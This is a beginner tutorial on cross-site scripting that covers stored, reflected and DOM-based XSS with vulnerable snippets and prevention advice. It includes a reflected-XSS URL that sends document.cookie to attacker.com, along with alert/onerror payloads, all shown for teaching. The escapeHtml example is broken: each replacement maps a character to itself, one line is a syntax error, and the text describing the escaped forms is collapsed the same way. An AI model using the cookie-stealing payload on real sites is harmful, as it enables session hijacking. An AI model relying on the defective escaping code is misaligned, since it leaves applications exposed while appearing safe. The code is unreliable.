# Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a type of security vulnerability typically found in web applications. XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy.

## Core Concepts

XSS attacks occur when an application includes untrusted data in a new web page without proper validation or escaping, or when it updates an existing web page with user-supplied data using a browser API that can create HTML or JavaScript.

There are three main types of XSS attacks:

1.  **Stored XSS (Persistent XSS):**
    *   The malicious script is permanently stored on the target server, such as in a database, message forum, visitor log, comment field, etc.
    *   When a user requests the stored information, the server sends the malicious script to the victim's browser, which then executes it.
    *   This is often considered the most dangerous type of XSS.

2.  **Reflected XSS (Non-Persistent XSS):**
    *   The malicious script is reflected off a web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request.
    *   The script is embedded in a URL or other data submitted to the server, and then reflected back to the user's browser.
    *   To execute the attack, the attacker must trick the victim into clicking a malicious link or submitting a specially crafted form.

3.  **DOM-based XSS:**
    *   The vulnerability exists in the client-side code rather than the server-side code.
    *   The attack payload is executed as a result of modifying the DOM (Document Object Model) environment in the victim's browser used by the original client-side script.
    *   The page itself (the HTTP response) does not change, but the client-side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.

## How XSS Attacks Work

Imagine a website with a search feature. If the search term is directly displayed on the results page without sanitization, an attacker could craft a search query like this:

`<script>alert('XSS Attack!');</script>`

If a user clicks a link containing this malicious search query, or if this query is stored and later displayed to users, the script will execute in the user's browser, showing an alert box. While an alert box is harmless, attackers can use XSS to:

*   Steal cookies (session tokens)
*   Log keystrokes
*   Capture screenshots
*   Redirect users to malicious websites
*   Perform actions on behalf of the user (e.g., make purchases, transfer funds)
*   Deface websites
*   Install malware

## Benefits of Preventing XSS

*   **User Trust:** Protects users from malicious attacks, maintaining their trust in the application.
*   **Data Integrity:** Prevents unauthorized access to and modification of user data.
*   **Reputation:** Safeguards the reputation of the application and the organization.
*   **Compliance:** Helps meet regulatory requirements for data security and privacy.

## Drawbacks if XSS is Not Handled

*   **Session Hijacking:** Attackers can steal session cookies and impersonate legitimate users.
*   **Data Theft:** Sensitive information like login credentials, personal details, and financial data can be stolen.
*   **Malware Distribution:** Users can be tricked into downloading malware.
*   **Account Takeover:** Attackers can gain full control over user accounts.
*   **Legal and Financial Consequences:** Data breaches can lead to lawsuits, fines, and significant financial losses.

## Use Cases and Examples

### Example 1: Reflected XSS in a Search Parameter

A website `example.com` has a search page: `https://example.com/search?query=searchTerm`
If `searchTerm` is directly rendered on the page:

```html
<!-- Server-side template (e.g., PHP, Node.js with a template engine) -->
<div>You searched for: <?php echo $_GET['query']; ?></div>
```

An attacker can craft a URL:
`https://example.com/search?query=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`

If a victim clicks this link, their browser executes the script, sending their cookies to the attacker's server.

### Example 2: Stored XSS in a Comment Section

A blog allows users to post comments. If comments are stored and displayed without sanitization:

```html
<!-- User posts a comment -->
<textarea name="comment"></textarea> <!-- User enters: <script>stealCredentials();</script> -->

<!-- Later, when displaying comments -->
<div class="comment">
  <p>[User's comment, e.g., <script>stealCredentials();</script>, gets rendered here]</p>
</div>
```
Any user viewing the page with this comment will execute the `stealCredentials()` script.

### Example 3: DOM-based XSS

Consider JavaScript code that reads from `window.location.hash` and writes it to the page using `innerHTML`:

```html
<!-- index.html -->
<div id="greeting"></div>
<script>
  var name = window.location.hash.substring(1); // Get name from # after URL
  document.getElementById("greeting").innerHTML = "Welcome, " + name + "!";
</script>
```

An attacker can craft a URL: `https://example.com/index.html#<img src=x onerror=alert(1)>`
When a user visits this URL, the `<img>` tag with the `onerror` event handler is written into the DOM, causing the `alert(1)` to execute.

## Best Practices for Preventing XSS

1.  **Encode Output (Contextual Escaping):**
    *   The primary defense against XSS is to escape untrusted data before rendering it in HTML. The type of escaping depends on where the data is being inserted:
        *   **HTML Body:** Escape characters like `&`, `<`, `>`, `"`, `'`. (e.g., `&`, `<`, `>`, `"`, `&#x27;`).
        *   **HTML Attributes:** Escape characters within attribute values. Be especially careful with unquoted attributes or attributes that can accept `javascript:` URLs (e.g., `href`, `src`).
        *   **JavaScript:** Escape data placed into JavaScript contexts. Avoid inserting untrusted data directly into scripts. If you must, use specific JS encoding functions and place data within quoted strings.
        *   **CSS:** Escape data placed into CSS contexts. Avoid untrusted data in style properties that can execute code (e.g., `url()`, `expression()`).
        *   **URL Parameters:** URL-encode data placed into URL query parameters.

    ```javascript
    // Example: Encoding in JavaScript (Node.js with a hypothetical 'escapeHtml' function)
    function escapeHtml(unsafe) {
        return unsafe
             .replace(/&/g, "&")
             .replace(/</g, "<")
             .replace(/>/g, ">")
             .replace(/"/g, """)
             .replace(/'/g, "&#x27;");
    }

    let userInput = "<script>alert('XSS')</script>";
    let safeOutput = escapeHtml(userInput);
    // document.getElementById('output').innerHTML = safeOutput; // Renders as text, not script
    ```

2.  **Validate Input:**
    *   Implement strict input validation on both client-side and server-side.
    *   Use allow-lists (whitelisting) for expected input formats (e.g., only allow alphanumeric characters for a username).
    *   Reject any input that does not conform to the expected format.

3.  **Use Content Security Policy (CSP):**
    *   CSP is an HTTP header that allows you to control what resources (scripts, styles, images, etc.) a browser is allowed to load for a given page.
    *   It can significantly reduce the risk and impact of XSS attacks by restricting where scripts can be loaded from and executed.
    *   Example CSP header:
        `Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com;`
        This policy allows resources only from the same origin (`'self'`) and scripts from `apis.google.com`.

4.  **Use HTTPOnly Cookies:**
    *   Set the `HttpOnly` flag on session cookies. This prevents client-side JavaScript from accessing the cookie, mitigating the risk of session hijacking via XSS.

5.  **Use Framework-Specific Protections:**
    *   Modern frontend frameworks (React, Angular, Vue) often have built-in XSS protections.
        *   **React:** Automatically escapes dynamic content rendered in JSX. Be cautious when using `dangerouslySetInnerHTML`.
        *   **Angular:** Sanitizes values by default when using property binding (`[innerHTML]="value"`) or interpolation (`{{ value }}`). Provides `DomSanitizer` for explicitly trusting values.
        *   **Vue:** Automatically escapes content in templates (`{{ }}` and `v-html` if not careful). `v-html` should be used with caution and only on trusted HTML.

    ```jsx
    // React Example
    function UserProfile({ bio }) {
      // 'bio' might contain malicious script if not handled carefully
      // React escapes by default:
      return <div>{bio}</div>; // Safe

      // If you must render HTML from a trusted source:
      // const trustedHtml = { __html: bio };
      // return <div dangerouslySetInnerHTML={trustedHtml} />; // Use with extreme caution
    }
    ```

6.  **Avoid `eval()` and `new Function()`:**
    *   Avoid using `eval()` or `new Function()` with dynamic, untrusted input, as these can execute arbitrary JavaScript.

7.  **Set `X-XSS-Protection` Header (Legacy):**
    *   While largely superseded by CSP, this header can enable XSS filtering in older browsers.
    *   `X-XSS-Protection: 1; mode=block`
    *   Note: Modern browsers are phasing out support for this header in favor of CSP.

8.  **Regular Security Audits and Penetration Testing:**
    *   Conduct regular code reviews and security testing to identify and fix XSS vulnerabilities.

## Common Beginner Doubts

1.  **Isn't client-side validation enough?**
    *   No. Client-side validation is a good user experience feature but can be easily bypassed by attackers (e.g., by disabling JavaScript or crafting HTTP requests directly). Server-side validation and output encoding are crucial.

2.  **If I use a modern framework like React/Angular/Vue, am I automatically safe from XSS?**
    *   These frameworks provide significant built-in protection by default (e.g., auto-escaping). However, they are not foolproof. Vulnerabilities can still be introduced if developers:
        *   Explicitly use unsafe methods like `dangerouslySetInnerHTML` (React), `[innerHTML]` with bypassed sanitization (Angular), or `v-html` (Vue) with untrusted content.
        *   Inject data into non-HTML contexts (like `<script>` tags or `javascript:` URLs) without proper sanitization.
        *   Use third-party libraries that have XSS vulnerabilities.
    *   Always follow security best practices even when using these frameworks.

3.  **What's the difference between encoding, escaping, and sanitization?**
    *   **Encoding/Escaping:** These terms are often used interchangeably. It means transforming data so that special characters are treated as literal data, not as control characters or code. For example, `<` becomes `<`. This is the primary defense.
    *   **Sanitization:** This typically means cleaning up data by removing or modifying potentially malicious parts. For example, stripping out all `<script>` tags. While it can be part of a defense-in-depth strategy, relying solely on sanitization (especially with block-lists) is risky because attackers are creative at bypassing filters. Output encoding is generally preferred.

4.  **Can XSS happen even if I don't have a database or server-side storage for user input?**
    *   Yes. Reflected XSS and DOM-based XSS do not require the malicious script to be stored on the server. Reflected XSS involves the server echoing back user input immediately, while DOM-based XSS occurs entirely on the client-side.

5.  **Is it okay to use `innerHTML` if I'm sure the content is safe?**
    *   Using `innerHTML` with any user-influenced content is risky. It's better to use safer alternatives like `textContent` (for inserting text only) or DOM manipulation methods (`createElement`, `appendChild`) that don't parse HTML strings. If you absolutely must use `innerHTML` with dynamic content, ensure it's from a fully trusted source or has been rigorously sanitized and escaped.

6.  **How does Content Security Policy (CSP) help prevent XSS?**
    *   CSP tells the browser which sources of content are legitimate. For example, you can specify that scripts should only be loaded from your own domain. If an attacker manages to inject a `<script src="http://malicious.com/evil.js"></script>` tag, a browser supporting CSP will block the script from loading because `malicious.com` is not an allowed source. CSP can also restrict inline scripts and `eval()`.

By understanding the types of XSS, how they work, and implementing robust prevention techniques, developers can build more secure frontend applications.
